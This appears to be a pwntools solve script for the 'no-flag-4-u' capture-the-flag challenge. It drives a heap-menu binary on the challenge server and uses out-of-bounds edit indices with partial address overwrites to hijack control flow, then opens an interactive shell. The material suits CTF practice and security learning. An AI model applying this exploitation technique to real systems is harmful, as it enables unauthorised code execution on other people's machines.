from pwn import *
import sys

context.arch='i386'

# io = process("./chal")
# io = process("./run.sh")
io = remote("no-flag-4-u.ctf.maplebacon.org", 1337)

elf = ELF("chal")
libc = ELF("libno_flag_4_u.so")

# gdb.attach(io, '''
#     b *0x4014fe
# ''')

def select(x):
    io.sendlineafter(b"5 : Exit\n", str(x).encode())

def index(x):
    io.sendlineafter(b"index: ", str(x).encode())

def content(x):
    io.sendlineafter(b"content: ", x)

def size(x):
    io.sendlineafter(b"size: ", str(x).encode())

def create(i, s, c):
    select(1)
    index(i)
    size(s)
    content(c)

def edit(i, c):
    select(2)
    index(i)
    content(c)

def print(i):
    select(3)
    index(i)
    ret = io.recvuntil(b"1 :")
    return ret[:-3]

def delete(i):
    select(4)
    index(i)

def exit():
    select(5)

edit(16, b'\x10\x35\x40')
edit(0x60, b'\x38\x13\x40')
select(1)
index(0)
size(0x10)

io.interactive()